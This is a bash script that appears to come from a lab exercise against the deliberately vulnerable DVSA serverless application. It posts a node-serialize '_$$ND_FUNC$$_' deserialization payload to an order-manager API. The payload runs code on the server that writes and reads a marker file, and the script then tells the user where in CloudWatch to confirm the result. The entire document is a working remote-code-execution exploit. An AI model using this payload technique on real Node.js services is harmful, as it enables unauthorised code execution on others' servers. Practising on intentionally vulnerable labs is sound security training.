#!/bin/bash

curl -X POST "$API" \
  -H "Content-Type: application/json" \
  -d '{
    "action": "_$$ND_FUNC$$_function(){
      var fs = require(\"fs\");
      fs.writeFileSync(\"/tmp/pwned.txt\", \"You are reading the contents of my hacked file!\");
      var d = fs.readFileSync(\"/tmp/pwned.txt\", \"utf-8\");
      console.error(\"FILE READ SUCCESS: \" + d);
    }()",
    "cart-id": ""
  }'

echo
echo "Check CloudWatch:"
echo "AWS Console -> CloudWatch -> Log groups -> /aws/lambda/DVSA-ORDER-MANAGER"
echo "Search for: FILE READ SUCCESS"
